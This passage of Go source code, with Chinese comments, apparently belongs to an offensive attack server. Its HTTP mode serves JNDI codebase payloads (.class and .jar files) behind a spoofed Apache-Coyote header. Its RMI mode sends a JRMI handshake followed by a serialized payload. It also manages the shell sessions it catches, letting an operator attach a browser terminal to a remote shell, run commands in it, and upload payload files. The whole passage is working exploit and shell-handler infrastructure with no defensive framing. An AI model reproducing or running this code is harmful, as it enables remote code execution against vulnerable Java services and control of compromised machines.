// HTTP 模式：JNDI CodeBase 服务
// ------------------------------------------------------------------

func (s *session) handleHTTP() {
	if s.cfg.InitialDelayMs > 0 {
		time.Sleep(time.Duration(s.cfg.InitialDelayMs) * time.Millisecond)
	}
	s.conn.SetReadDeadline(time.Now().Add(15 * time.Second))
	br := bufio.NewReaderSize(s.conn, 16384)
	var header bytes.Buffer
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return
		}
		header.WriteString(line)
		if line == "\r\n" || line == "\n" {
			break
		}
		if header.Len() > 64*1024 {
			return
		}
	}
	raw := header.Bytes()
	s.onData(raw)
	if s.isClosed() {
		return
	}

	reqLine := strings.SplitN(strings.SplitN(header.String(), "\r\n", 2)[0], " ", 3)
	path := "/"
	if len(reqLine) >= 2 {
		path = strings.TrimPrefix(reqLine[1], "/")
		if i := strings.IndexByte(path, '?'); i >= 0 {
			path = path[:i]
		}
	}
	s.listener.addEvent(eventInfo, s.remote, "HTTP 请求 "+path)

	status := s.cfg.HTTPStatus
	if status == 0 {
		status = 200
	}
	body, ctype := s.httpBodyFor(path)
	if body == nil {
		// payload 目录里没有该文件
		status, body, ctype = 404, []byte("not found\n"), "text/plain; charset=utf-8"
	}
	s.sendString(fmt.Sprintf("HTTP/1.1 %d %s\r\nServer: Apache-Coyote/1.1\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n",
		status, httpStatusText(status), ctype, len(body)))
	s.send(body)
	s.listener.addEvent(eventInfo, s.remote, fmt.Sprintf("HTTP 响应 %d，%d 字节 %s", status, len(body), path))
}

func httpStatusText(code int) string {
	switch code {
	case 200:
		return "OK"
	case 404:
		return "Not Found"
	case 500:
		return "Internal Server Error"
	default:
		return "OK"
	}
}

// httpBodyFor 按请求路径返回 payload 文件
func (s *session) httpBodyFor(path string) ([]byte, string) {
	name := filepath.Base(path)
	if name == "" || name == "." || name == "/" {
		return nil, ""
	}
	if s.cfg.ServePayloadDir {
		if b, err := os.ReadFile(filepath.Join(payloadDir, name)); err == nil {
			ctype := s.cfg.HTTPContentType
			if ctype == "" || ctype == "application/octet-stream" {
				ctype = contentTypeByName(name)
			}
			return b, ctype
		}
	}
	if s.cfg.HTTPBody != "" && (path == "" || path == "index.html") {
		return []byte(s.cfg.HTTPBody), s.cfg.HTTPContentType
	}
	if b, err := s.rmiPayload(); err == nil && len(b) > 0 {
		return b, s.cfg.HTTPContentType
	}
	return nil, ""
}

func contentTypeByName(name string) string {
	switch strings.ToLower(filepath.Ext(name)) {
	case ".class":
		return "application/java-vm"
	case ".jar":
		return "application/java-archive"
	case ".so":
		return "application/octet-stream"
	case ".json":
		return "application/json"
	case ".txt":
		return "text/plain; charset=utf-8"
	default:
		return "application/octet-stream"
	}
}

// ------------------------------------------------------------------
// RMI 模式：JRMI 握手 + 自定义序列化载荷
// ------------------------------------------------------------------

func (s *session) handleRMI() {
	// JRMI 头：magic "JRMI" + 版本 0x0002 + StreamProtocol 0x4B
	s.send([]byte{'J', 'R', 'M', 'I', 0x00, 0x02, 0x4b})
	s.listener.addEvent(eventInfo, s.remote, "已发送 JRMI 协议头")
	buf := make([]byte, 8192)
	n, err := s.conn.Read(buf)
	if n > 0 {
		s.onData(buf[:n])
	}
	if err != nil || s.isClosed() {
		return
	}
	s.sendDefaultPayload()
	// 之后保持连接，继续接收（客户端后续调用可继续触发规则）
	for {
		n, err := s.conn.Read(buf)
		if n > 0 {
			s.onData(buf[:n])
		}
		if err != nil {
			s.waitPending()
			return
		}
	}
}

// sendDefaultPayload 发送监听上配置的默认载荷（RMI 序列化数据等）
func (s *session) sendDefaultPayload() {
	b, err := s.rmiPayload()
	if err != nil || len(b) == 0 {
		return
	}
	s.send(b)
	s.listener.addEvent(eventPayload, s.remote, fmt.Sprintf("已发送默认载荷 %d 字节", len(b)))
}

// ------------------------------------------------------------------
// 会话查询与浏览器挂载
// ------------------------------------------------------------------

// ListSessions 列出会话（按开始时间倒序）
func ListSessions(listenerID string) []SessionView {
	mu.RLock()
	rts := make([]*runtime, 0, len(listeners))
	if listenerID != "" {
		if rt := listeners[listenerID]; rt != nil {
			rts = append(rts, rt)
		}
	} else {
		for _, rt := range listeners {
			rts = append(rts, rt)
		}
	}
	mu.RUnlock()

	var out []SessionView
	for _, rt := range rts {
		rt.mu.Lock()
		for _, s := range rt.sessions {
			out = append(out, s.view())
		}
		rt.mu.Unlock()
	}
	sort.Slice(out, func(i, j int) bool { return out[i].StartedAt > out[j].StartedAt })
	return out
}

func (s *session) view() SessionView {
	return SessionView{
		ID: s.id, ListenerID: s.lid, ListenerNm: s.lname,
		Mode: s.mode, Remote: s.remote,
		StartedAt: s.started.Format("2006-01-02 15:04:05"),
		BytesIn:   atomic.LoadInt64(&s.bytesIn), BytesOut: atomic.LoadInt64(&s.bytesOut),
		Attached: s.attached(), Closed: s.closed.Load(), Cmds: int(s.autoCmds.Load()),
	}
}

func (s *session) attached() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.subs) > 0
}

// GetSession 按会话 ID 查找
func GetSession(id string) *session {
	mu.RLock()
	defer mu.RUnlock()
	for _, rt := range listeners {
		rt.mu.Lock()
		s := rt.sessions[id]
		rt.mu.Unlock()
		if s != nil {
			return s
		}
	}
	return nil
}

// Attach 把浏览器终端挂到会话上：先回放历史输出，再持续推送新数据。
// 返回的 channel 关闭即代表会话结束。
func (s *session) Attach() (<-chan []byte, func()) {
	s.mu.Lock()
	id := s.nextSub
	s.nextSub++
	ch := make(chan []byte, 512)
	// 先塞历史，保证新挂上来能立刻看到之前的输出
	if len(s.hist) > 0 {
		ch <- append([]byte(nil), s.hist...)
	}
	if s.closed.Load() {
		// 已结束的会话只回放历史
		close(ch)
		s.mu.Unlock()
		return ch, func() {}
	}
	s.subs[id] = ch
	s.mu.Unlock()

	detach := func() {
		s.mu.Lock()
		if c, ok := s.subs[id]; ok {
			delete(s.subs, id)
			close(c)
		}
		s.mu.Unlock()
	}
	return ch, detach
}

// SendInput 把浏览器输入写回对端 shell
func (s *session) SendInput(b []byte) { s.send(b) }

// Exec 在 shell 会话里执行一条命令（自动补换行）
func (s *session) Exec(cmd string) error {
	if s.isClosed() {
		return fmt.Errorf("会话已关闭")
	}
	_, err := s.send([]byte(strings.TrimRight(cmd, "\r\n") + "\n"))
	return err
}

// KillSession 主动断开某个会话
func KillSession(id string) error {
	s := GetSession(id)
	if s == nil {
		return fmt.Errorf("会话不存在")
	}
	s.listener.addEvent(eventInfo, s.remote, "管理员手动断开会话 "+shortID(id))
	s.close()
	return nil
}

// PayloadFiles 列出 payload 目录里的文件
func PayloadFiles() ([]map[string]any, error) {
	entries, err := os.ReadDir(payloadDir)
	if err != nil {
		return nil, err
	}
	out := make([]map[string]any, 0, len(entries))
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		out = append(out, map[string]any{
			"name":     e.Name(),
			"size":     info.Size(),
			"modified": info.ModTime().Format("2006-01-02 15:04:05"),
		})
	}
	return out, nil
}

// SavePayload 保存上传的 payload 文件（文件名做净化，只保留 base）
func SavePayload(name string, data []byte) (string, error) {
	name = filepath.Base(name)
	if name == "" || name == "." || name == ".." {
		return "", fmt.Errorf("文件名无效")
	}
	if err := os.MkdirAll(payloadDir, 0o755); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(payloadDir, name), data, 0o644); err != nil {
		return "", err
	}
	return name, nil
}

// DeletePayload 删除 payload 文件
func DeletePayload(name string) error {
	name = filepath.Base(name)
	if name == "" || name == "." || name == ".." {
		return fmt.Errorf("文件名无效")
	}
	return os.Remove(filepath.Join(payloadDir, name))
}
